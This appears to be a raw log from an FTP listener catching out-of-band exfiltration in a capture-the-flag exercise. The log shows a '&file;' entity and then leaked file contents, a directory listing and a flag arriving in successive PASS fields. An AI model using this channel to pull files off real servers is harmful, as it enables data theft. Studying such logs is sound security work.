get req: "USER test\r\n"
get req: "PASS test\r\n"
get req: "TYPE A\r\n"
get req: "EPSV ALL\r\n"
get req: "EPSV\r\n"
get req: "EPRT |1|172.19.0.2|43343|\r\n"
get req: "LIST\r\n"
get req: "PORT 172,19,0,2,169,79\r\n"
get req: "LIST\r\n"
get req: "USER test\r\n"
get req: "PASS &file;\r\n"
get req: "TYPE A\r\n"
get req: "EPSV ALL\r\n"
get req: "EPSV\r\n"
get req: "EPRT |1|172.19.0.2|40497|\r\n"
get req: "LIST\r\n"
get req: "PORT 172,19,0,2,158,49\r\n"
get req: "LIST\r\n"
get req: "USER test\r\n"
get req: "PASS ab\n"
get req: "cdef\n"
get req: "g\n"
get req: "h\n"
get req: "ijk\n"
get req: "lmop\n"
get req: "\r\n"
get req: "TYPE A\r\n"
get req: "EPSV ALL\r\n"
get req: "EPSV\r\n"
get req: "EPRT |1|172.19.0.2|33729|\r\n"
get req: "LIST\r\n"
get req: "USER test\r\n"
get req: "PASS .gitkeep\n"
get req: "flag.txt\n"
get req: "\r\n"
get req: "TYPE A\r\n"
get req: "EPSV ALL\r\n"
get req: "EPSV\r\n"
get req: "EPRT |1|172.19.0.2|46037|\r\n"
get req: "LIST\r\n"
get req: "USER test\r\n"
get req: "PASS Got it !\n"
get req: "flag-ce926abb19bb8d6a79b6f5a346ec0b39\r\n"
get req: "TYPE A\r\n"
get req: "EPSV ALL\r\n"
get req: "EPSV\r\n"
get req: "EPRT |1|172.19.0.2|38321|\r\n"
get req: "LIST\r\n"
